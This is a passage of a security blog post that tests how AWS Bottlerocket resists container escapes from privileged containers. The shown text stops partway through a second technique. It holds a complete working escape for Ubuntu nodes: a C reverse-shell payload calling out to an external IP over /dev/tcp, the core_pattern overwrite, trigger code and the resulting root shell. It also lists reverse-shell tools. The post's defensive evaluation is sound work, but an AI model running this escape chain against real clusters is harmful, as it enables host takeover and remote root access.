
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
        <meta name="description" content="Cloud & Container Security">
      
      
      
        <link rel="canonical" href="https://pitfallen.net/blog/hands-on-with-aws-bottlerocket/">
      
      
        <link rel="prev" href="../eks-hardening-blocking-pod-level-access-to-imds/">
      
      
      
        
      
      
        <link rel="alternate" type="application/rss+xml" title="RSS feed" href="../../feed_rss_created.xml">
        <link rel="alternate" type="application/rss+xml" title="RSS feed of updated content" href="../../feed_rss_updated.xml">
      
      <link rel="icon" href="../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.0">
    
    
      
        <title>Hands On with AWS Bottlerocket: Evaluating the Security of Amazon's Hardened OS - pitfallen.net</title>
      
    
    
      <link rel="stylesheet" href="../../assets/stylesheets/main.618322db.min.css">
      
        
        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
  
<meta property="og:type" content="website" />
<meta property="og:title" content="Hands On with AWS Bottlerocket: Evaluating the Security of Amazon's Hardened OS - pitfallen.net" />
<meta property="og:description" content="Cloud & Container Security" />
<meta property="og:image" content="https://pitfallen.net/assets/images/social/blog/hands-on-with-aws-bottlerocket.png" />
<meta property="og:image:type" content="image/png" />
<meta property="og:image:width" content="1200" />
<meta property="og:image:height" content="630" />
<meta property="og:url" content="https://pitfallen.net/blog/hands-on-with-aws-bottlerocket/" />
<meta property="twitter:card" content="summary_large_image" />
<meta property="twitter:title" content="Hands On with AWS Bottlerocket: Evaluating the Security of Amazon's Hardened OS - pitfallen.net" />
<meta property="twitter:description" content="Cloud & Container Security" />
<meta property="twitter:image" content="https://pitfallen.net/assets/images/social/blog/hands-on-with-aws-bottlerocket.png" />
</head>
  
  
    
    
    
    
    
    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="lime" data-md-color-accent="lime">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#hands-on-with-aws-bottlerocket-evaluating-the-security-of-amazons-hardened-os" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

  

<header class="md-header md-header--shadow" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../.." title="pitfallen.net" class="md-header__button md-logo" aria-label="pitfallen.net" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 19V7H4v12zm0-16a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2zm-7 14v-2h5v2zm-3.42-4L5.57 9H8.4l3.3 3.3c.39.39.39 1.03 0 1.42L8.42 17H5.59z"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            pitfallen.net
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Hands On with AWS Bottlerocket: Evaluating the Security of Amazon's Hardened OS
            
          </span>
        </div>
      </div>
    </div>
    
      
    
    
    
    
      
      
        <label class="md-header__button md-icon" for="__search">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        </label>
        <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
      
    
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
                
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" hidden>
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    



<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../.." title="pitfallen.net" class="md-nav__button md-logo" aria-label="pitfallen.net" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 19V7H4v12zm0-16a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2zm-7 14v-2h5v2zm-3.42-4L5.57 9H8.4l3.3 3.3c.39.39.39 1.03 0 1.42L8.42 17H5.59z"/></svg>

    </a>
    pitfallen.net
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
    
  
  
    
  
  
    <li class="md-nav__item md-nav__item--active">
      <a href="../.." class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Cloud &amp; Container Security
  

    
  </span>
  
  

      </a>
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
                
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#introduction" class="md-nav__link">
    <span class="md-ellipsis">
      
        Introduction
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#the-premise" class="md-nav__link">
    <span class="md-ellipsis">
      
        The Premise
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#technique-1-abusing-the-kernel-usermode-helper-by-triggering-a-coredump" class="md-nav__link">
    <span class="md-ellipsis">
      
        Technique 1: Abusing the Kernel Usermode Helper by Triggering a Coredump
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#technique-2-mounting-the-host-filesystem" class="md-nav__link">
    <span class="md-ellipsis">
      
        Technique 2: Mounting the Host Filesystem
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#technique-3-loading-a-custom-kernel-module" class="md-nav__link">
    <span class="md-ellipsis">
      
        Technique 3: Loading a Custom Kernel Module
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#conclusion" class="md-nav__link">
    <span class="md-ellipsis">
      
        Conclusion
      
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
  <div class="md-content md-content--post" data-md-component="content">
    <div class="md-sidebar md-sidebar--post" data-md-component="sidebar" data-md-type="navigation">
      <div class="md-sidebar__scrollwrap">
        <div class="md-sidebar__inner md-post">
          <nav class="md-nav md-nav--primary">
            <div class="md-post__back">
              <div class="md-nav__title md-nav__container">
                <a href="../.." class="md-nav__link">
                  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
                  <span class="md-ellipsis">
                    Back to index
                  </span>
                </a>
              </div>
            </div>
            
              <div class="md-post__authors md-typeset">
                
                  <div class="md-profile md-post__profile">
                    <span class="md-author md-author--long">
                      <img src="../../assets/images/author.jpg" alt="Terry Franklin">
                    </span>
                    <span class="md-profile__description">
                      <strong>
                        
                          <a href="https://www.linkedin.com/in/terryf82/">Terry Franklin</a>
                        
                      </strong>
                      <br>
                      
                    </span>
                  </div>
                
              </div>
            
            <ul class="md-post__meta md-nav__list">
              <li class="md-nav__item md-nav__item--section">
                <div class="md-post__title">
                  <span class="md-ellipsis">
                    Metadata
                  </span>
                </div>
                <nav class="md-nav">
                  <ul class="md-nav__list">
                    <li class="md-nav__item">
                      <div class="md-nav__link">
                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 19H5V8h14m-3-7v2H8V1H6v2H5c-1.11 0-2 .89-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V5a2 2 0 0 0-2-2h-1V1m-1 11h-5v5h5z"/></svg>
                        <time datetime="2025-12-10 00:00:00+00:00" class="md-ellipsis">December 10, 2025</time>
                      </div>
                    </li>
                    
                    
                    
                      
                      <li class="md-nav__item">
                        <div class="md-nav__link">
                          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20a8 8 0 0 0 8-8 8 8 0 0 0-8-8 8 8 0 0 0-8 8 8 8 0 0 0 8 8m0-18a10 10 0 0 1 10 10 10 10 0 0 1-10 10C6.47 22 2 17.5 2 12A10 10 0 0 1 12 2m.5 5v5.25l4.5 2.67-.75 1.23L11 13V7z"/></svg>
                          <span class="md-ellipsis">
                            
                              17 min read
                            
                          </span>
                        </div>
                      </li>
                    
                  </ul>
                </nav>
              </li>
            </ul>
            
          </nav>
          
        </div>
      </div>
    </div>
    <article class="md-content__inner md-typeset">
      
        
  




<h1 id="hands-on-with-aws-bottlerocket-evaluating-the-security-of-amazons-hardened-os">Hands On with AWS Bottlerocket: Evaluating the Security of Amazon's Hardened OS</h1>
<p><em>AWS Bottlerocket is well-known as a secure, minimalist operating system, often used to provide a reliable container hosting environment through enhanced security features and reduced attack surface. But how does it actually work when faced with common container escape techniques? Read on to find out!</em></p>
<p><img alt="Hands On with AWS Bottlerocket: Evaluating the Security of Amazon's Hardened OS" src="../../assets/images/post2.png" /></p>
<!-- more -->

<h2 id="introduction">Introduction</h2>
<p>When it comes to deciding how to configure a kubernetes cluster, choosing an operating system for the worker nodes isn't always the first thing that comes to mind. Often, users will simply go with their chosen cloud provider's default offering (<em>Amazon Linux</em> for AWS, <em>Container-Optimized OS</em> for GCP, <em>Azure Linux</em> for.. Azure). Others will opt for an OS they might be familiar with, such as Ubuntu Linux, out of a desire for familiarity - should there be a need to interact with the nodes for troubleshooting purposes, knowing where to look for certain log files, or how to install and run common debugging utilities, can be a big help when trying to resolve problems.</p>
<p>For those seeking to maximise the security of their cluster, however, AWS Bottlerocket should definitely be considered. First released in 2020, the project aims to provide a reliable and highly secure opearting system, by employing a number of complimentary features:</p>
<ol>
<li>
<p>a read-only root filesystem via the <em>dm-verity</em> kernel module, that provides transparent integrity checking of the block device using a cryptographic hash tree. Any change to the hash will lead to the kernel detecting corruption, triggering an immediate reboot</p>
</li>
<li>
<p>an always-enabled and enforced, restrictive <em>SELinux</em> policy, for the parts of the filesystem that are mutable. When used as a worker node OS, this helps prevent containers from executing dangerous operations on the host and each other, even when they run as root</p>
</li>
<li>
<p>no command shell, package manager or language interpreters are installed. OS updates are managed by a utility known as <em>TUF (The Update Framework)</em>, which delivers atomic, cryptographically-signed update images, as well as blocking malicious rollback attacks and the use of compromised repository keys. Administration tasks are carried out using two purpose-built containers: the <em>control container</em> intended for standard management tasks, and the <em>admin container</em> for high-privilege &amp; emergency tasks. These are both run by a completely separate instance of the container runtime (<em>containerd</em>) to that which runs applications and workloads in a cluster, further enhancing security</p>
</li>
<li>
<p>ephemeral, template-rendered system configuration files, such as those residing in <code>/etc</code>. The settings for these files are actually retrieved from an internal Bottlerocket API, helping to block common methods of persistence, e.g malicious <em>cron</em> entries</p>
</li>
<li>
<p>kernel lockdown via <em>integrity mode</em>, that prevents an attacker with sufficient privileges from loading unsigned kernel modules</p>
</li>
<li>
<p><em>confidentiality mode</em> which takes <em>integrity mode</em> one step further, by preventing an attacker from also reading any of the kernel's memory from userspace</p>
</li>
</ol>
<h2 id="the-premise">The Premise</h2>
<p>While the <a href="https://aws.amazon.com/bottlerocket/">official documentation</a> from AWS does a good job of providing a high-level overview of how these security features work, I typically find it much more instructive to get hands-on with this kind of thing and test out some actual attack paths, in order to better understand how the defence mechanisms work. In that spirit, this post aims to provide a short overview of how Bottlerocket is able to defeat three well-established container escape techniques, while a less-hardened OS (Ubuntu default install, in this case) may fail.</p>
<p>To be clear, none of the container escape techniques listed here are novel, and they all depend on the ill advised (yet still common) practice of running containers in <em>privileged mode</em>. A <a href="https://www.trendmicro.com/en_us/research/19/l/why-running-a-privileged-container-in-docker-is-a-bad-idea.html">lot</a> has <a href="https://learn.snyk.io/lesson/container-runs-in-privileged-mode/?ecosystem=kubernetes">already</a> been <a href="https://cloudnativenow.com/topics/cloudnativesecurity/why-running-a-privileged-container-is-not-a-good-idea/">written</a> about this subject and while most people know it's a bad idea, the pressure to deploy a new release on a tight schedule or get some new application feature working means that it still happens. <em>Not falling into the trap of deploying containers in privileged mode is one of the most beneficial security practices you can implement.</em></p>
<p>With that out of the way, let's deploy some containers and start escaping!</p>
<h2 id="technique-1-abusing-the-kernel-usermode-helper-by-triggering-a-coredump">Technique 1: Abusing the Kernel Usermode Helper by Triggering a Coredump</h2>
<p>As outlined in <a href="https://pwning.systems/posts/escaping-containers-for-fun/">this research paper from pwning.systems</a>, containers running in privileged mode can be escaped by abusing the kernel usermode helper. This attack involves configuring a malicious binary that will be run on the host (as root) when a coredump occurs inside the container, something that can easily be achieved.</p>
<p>The first step is to craft a payload to be run on the host. Some common examples for Linux-based environments include:</p>
<ul>
<li>adding a new ssh key to <code>/root/.ssh/authorized_keys</code></li>
<li>copying or modifying <code>/etc/passwd</code> or <code>/etc/shadow</code> (or any other system config file)</li>
<li>triggering a reverse shell via <code>bash</code>, <code>python3</code>, <code>nc</code> etc.</li>
</ul>
<p>For this demonstration our payload will be a simple reverse shell one-liner, that connects out to a netcat listener on a waiting AWS EC2 (with the assumed IP <code>15.230.15.77</code>). Written in C, the source for the payload is straightforward:
<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>// payload.c
</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>#include &lt;stdlib.h&gt;
</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>
</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>int main() {
</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>  const char *cmd = &quot;bash -i &gt;&amp; /dev/tcp/15.230.15.77/4444 0&gt;&amp;1&quot;;
</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>  system(cmd);
</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>  return 0;
</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>}
</span></code></pre></div></p>
<p>Once compiled via <code>gcc -o payload payload.c</code>, the next task is to identify where the <code>payload</code> binary actually exists, but on the host's filesystem. Container runtimes typically use <em>overlayfs</em> or similar to provide containers with what appears to be dedicated, isolated storage space, but in reality is just a folder stored on the node's filesystem. The path to this folder on the node can be retrieved by running <code>mount</code> and looking for the <code>upperdir</code> value:
<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>root@priv-app-ubuntu:/# mount
</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>overlay on / type overlay (rw,relatime,seclabel,lowerdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/178/fs,upperdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/183/fs,workdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/183/work,uuid=on)
</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>...
</span></code></pre></div></p>
<p>To prime the attack, we set the value of <code>/proc/sys/kernel/core_pattern</code> to the payload at the <em>upperdir</em> path, prefixed with a <code>|</code> character. As outlined in the research paper, this has the effect of the value being interpreted as a command to run in the event of a coredump:
<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>echo &quot;|/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/183/fs/payload&quot; &gt; /proc/sys/kernel/core_pattern
</span></code></pre></div></p>
<p>From this point, we simply need to trigger a coredump in the container. This can be achieved in a number of ways, one of which is by running some deliberately broken C code that dereferences a null pointer:
<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>// trigger.c
</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>#include &lt;stdio.h&gt;
</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>
</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>int main() {
</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>    int *ptr = NULL;
</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>    *ptr = 10;
</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>
</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a>    return 0;
</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a>}
</span></code></pre></div></p>
<p>From a container running on a Ubuntu-based node, compiling and running the trigger causes a coredump as expected:
<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>root@priv-app-ubuntu:/# gcc -o trigger trigger.c
</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>root@priv-app-ubuntu:/# ./trigger
</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>Segmentation fault (core dumped)
</span></code></pre></div></p>
<p>which in turn leads to a root-level reverse shell from the node being caught on the waiting EC2 ðŸ’€
<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>[ec2-user@ip-10-240-150-240 tmp]$ nc -lvnp 4444
</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>Ncat: Version 7.93 ( https://nmap.org/ncat )
</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>Ncat: Listening on :::4444
</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>Ncat: Listening on 0.0.0.0:4444
</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>Ncat: Connection from 51.26.193.49.
</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>Ncat: Connection from 51.26.193.49:18796.
</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a>sh: cannot set terminal process group (-1): Inappropriate ioctl for device
</span><span id="__span-5-8"><a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a>sh: no job control in this shell
</span><span id="__span-5-9"><a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a>sh-5.2# whoami
</span><span id="__span-5-10"><a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a>whoami
</span><span id="__span-5-11"><a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a>root
</span></code></pre></div></p>
<p>How might the situation change if the container was running on a Bottlerocket node? Using the same privileged setup, an attacker running loose inside the container can still perform the necessary setup steps listed above (retrieve the <code>upperdir</code> value using <code>mount</code>, compile a payload and set <code>/proc/sys/kernel/core_pattern</code>, then trigger a coredump inside the container):</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>root@priv-app-bottlerocket:/# ./trigger
</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>Segmentation fault
</span></code></pre></div>
<p>However this time, the waiting reverse shell listener remains unanswered:
<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>[ec2-user@ip-10-240-150-240 tmp]$ nc -lvnp 4444
</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>Ncat: Version 7.93 ( https://nmap.org/ncat )
</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>Ncat: Listening on :::4444
</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>Ncat: Listening on 0.0.0.0:4444
</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>...
</span></code></pre></div></p>
<p>What happened? As explained in the intro, Bottlerocket runs with SELinux enabled, a kernel security module that enforces mandatory access control via a labelling system. This prevents processes in a container from running in unexpected places, such as the host or another container. The node's system log confirms that SELinux has blocked execution of the malicious payload as intended:
<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>...
</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>AVC avc:  denied  { execute_no_trans } for  pid=6151 comm=&quot;kworker/u4:4&quot; path=&quot;/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/62/fs/payload&quot; dev=&quot;nvme1n1p1&quot; ino=17707920 scontext=system_u:system_r:kernel_t:s0 tcontext=system_u:object_r:data_t:s0:c665,c750 tclass=file permissive=0
</span></code></pre></div></p>
<p>The <code>payload</code> binary has been labelled with <code>data_t</code>, indicating that it must never be executed. Additionally, the kernel thread attempted execution without proper domain transition, which is disallowed by SELinux policy.</p>
<p><strong>Bonus Features!</strong></p>
<p>Could we have gotten further if SELinux hadn't blocked the payload execution? Not likely, since Bottlerocket implements layers of protection that make typical reverse shell payloads unusable. For example, take a look at what the default shell on a Bottlerocket node actually links to:</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>bash-5.1# ls -l /bin/sh
</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>lrwxrwxrwx. 1 root root 5 Sep 12 03:30 /bin/sh -&gt; brush
</span></code></pre></div>
<p><code>brush</code> is a nonstandard, restricted command runner, that doesn't implement typical interactive behaviour or shell redirection features. Essentially it's a minimalist interface to the Bottlerocket API client, meaning it doesn't have the bash-like features needed to establish the connection to our waiting listener. In a typical Linux environment, there are usually plenty of alternative ways to establish a reverse-shell - <a href="https://revshells.com">revshells.com</a> lists several, including:</p>
<ul>
<li><code>nc</code></li>
<li><code>busybox</code></li>
<li><code>perl</code></li>
<li><code>python3</code></li>
<li><code>php</code></li>
<li><code>ruby</code></li>
</ul>
<p>Unsurprisingly, none of these are present inside of Bottlerocket. By design, the OS comes with no (usable) shell, package manager or language interpreters - just a minimal container runtime ðŸš€</p>
<h2 id="technique-2-mounting-the-host-filesystem">Technique 2: Mounting the Host Filesystem</h2>
<p>Another common technique for escaping from a container is to access the host's filesystem, by simply mounting the relevant block device and make the contents available through the container's filesystem. Again, this escape relies on the fact that privileged mode disables a number of key security controls:</p>
<ol>
<li>the device cgroup controller's limitations that prevent processes inside the container interacting with host's block devices are lifted</li>
<li>the <code>cap_sys_admin</code> capability is enabled, allowing for the running of the <code>mount</code> command</li>
</ol>
<p>Executing this attack from a container hosted on a Ubuntu-based node is straightforward:</p>
<ol>
<li>
<p>list the available block devices via <code>lsblk</code>:
<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>root@app-priv-ubuntu:/# lsblk
</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>NAME         MAJ:MIN RM  SIZE RO TYPE MOUNTPOINTS
</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>loop0          7:0    0   24M  1 loop
</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>loop1          7:1    0 49.6M  1 loop
</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a>loop2          7:2    0 68.9M  1 loop
</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a>loop3          7:3    0 59.6M  1 loop
</span><span id="__span-10-7"><a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a>loop4          7:4    0  4.8M  1 loop
</span><span id="__span-10-8"><a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a>loop5          7:5    0 11.5M  1 loop
</span><span id="__span-10-9"><a id="__codelineno-10-9" name="__codelineno-10-9" href="#__codelineno-10-9"></a>loop6          7:6    0 15.3M  1 loop
</span><span id="__span-10-10"><a id="__codelineno-10-10" name="__codelineno-10-10" href="#__codelineno-10-10"></a>loop7          7:7    0 44.2M  1 loop
</span><span id="__span-10-11"><a id="__codelineno-10-11" name="__codelineno-10-11" href="#__codelineno-10-11"></a>nvme0n1      259:0    0   20G  0 disk
</span><span id="__span-10-12"><a id="__codelineno-10-12" name="__codelineno-10-12" href="#__codelineno-10-12"></a>|-nvme0n1p1  259:2    0   19G  0 part /etc/resolv.conf
</span><span id="__span-10-13"><a id="__codelineno-10-13" name="__codelineno-10-13" href="#__codelineno-10-13"></a>|                                     /etc/hostname
</span><span id="__span-10-14"><a id="__codelineno-10-14" name="__codelineno-10-14" href="#__codelineno-10-14"></a>|                                     /dev/termination-log
</span><span id="__span-10-15"><a id="__codelineno-10-15" name="__codelineno-10-15" href="#__codelineno-10-15"></a>|                                     /etc/hosts
